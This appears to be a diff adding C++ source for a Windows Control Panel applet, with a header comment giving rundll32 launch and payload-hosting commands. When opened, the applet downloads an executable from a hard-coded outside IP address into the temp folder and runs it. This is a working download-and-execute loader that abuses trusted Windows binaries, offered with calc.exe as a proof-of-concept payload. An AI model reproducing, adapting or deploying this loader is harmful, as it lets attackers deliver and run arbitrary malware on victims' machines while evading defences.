@@ -1,0 +1,145 @@
+/*
+rundll32.exe shell32.dll,Control_RunDLL C:\Windows\System32\InternetConnection.cpl
+python3 -m http.server 2020
+*/
+
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <fstream>
+#include <shlwapi.h>
+#include <cpl.h>
+
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "wininet.lib")
+
+extern "C" __declspec(dllexport) LONG CALLBACK CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2);
+
+BOOL DownloadAndRunCalc()
+{
+    HINTERNET hInternet = InternetOpen(L"MyUserAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) {
+        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
+        return FALSE;
+    }
+
+    LPCWSTR url = L"http://185.124.175.186:2020/calc.exe"; // Kept as requested
+    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnect) {
+        std::cerr << "InternetOpenUrl failed: " << GetLastError() << std::endl;
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    WCHAR tempPath[MAX_PATH];
+    if (!GetTempPathW(MAX_PATH, tempPath)) {
+        std::cerr << "GetTempPath failed: " << GetLastError() << std::endl;
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    WCHAR filePath[MAX_PATH];
+    if (!PathCombineW(filePath, tempPath, L"calc.exe")) {
+        std::cerr << "PathCombine failed: " << GetLastError() << std::endl;
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    std::ofstream outFile(filePath, std::ios::binary);
+    if (!outFile) {
+        std::cerr << "Failed to create output file" << std::endl;
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    char buffer[1024];
+    DWORD bytesRead;
+    BOOL success = TRUE;
+
+    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        outFile.write(buffer, bytesRead);
+        if (!outFile) {
+            std::cerr << "Failed to write to file" << std::endl;
+            success = FALSE;
+            break;
+        }
+    }
+
+    outFile.close();
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    if (!success) {
+        DeleteFileW(filePath);
+        return FALSE;
+    }
+
+    SHELLEXECUTEINFO sei = { sizeof(sei) };
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = L"open";
+    sei.lpFile = filePath;
+    sei.nShow = SW_SHOWNORMAL;
+
+    if (!ShellExecuteEx(&sei)) {
+        std::cerr << "Failed to execute calc.exe: " << GetLastError() << std::endl;
+        DeleteFileW(filePath);
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+extern "C" __declspec(dllexport)
+LONG CALLBACK CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
+{
+    switch (uMsg)
+    {
+    case CPL_INIT:
+        return TRUE;
+
+    case CPL_GETCOUNT:
+        return 1;
+
+    case CPL_INQUIRE:
+    {
+        LPCPLINFO lpCPlInfo = (LPCPLINFO)lParam2;
+        lpCPlInfo->idIcon = 0;
+        lpCPlInfo->idName = 0;
+        lpCPlInfo->idInfo = 0;
+        lpCPlInfo->lData = 0;
+        return TRUE;
+    }
+
+    case CPL_NEWINQUIRE:
+    {
+        LPNEWCPLINFO lpNewCPlInfo = (LPNEWCPLINFO)lParam2;
+        lpNewCPlInfo->dwSize = sizeof(NEWCPLINFO);
+        lpNewCPlInfo->dwFlags = 0;
+        lpNewCPlInfo->dwHelpContext = 0;
+        lpNewCPlInfo->lData = 0;
+        wcscpy_s(lpNewCPlInfo->szName, L"Download Utility");
+        wcscpy_s(lpNewCPlInfo->szInfo, L"Downloads and runs calc.exe");
+        lpNewCPlInfo->hIcon = LoadIcon(NULL, IDI_APPLICATION);
+        return TRUE;
+    }
+
+    case CPL_DBLCLK:
+        DownloadAndRunCalc();
+        return TRUE;
+
+    case CPL_STOP:
+    case CPL_EXIT:
+        return TRUE;
+
+    default:
+        return FALSE;
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    return TRUE;
+}
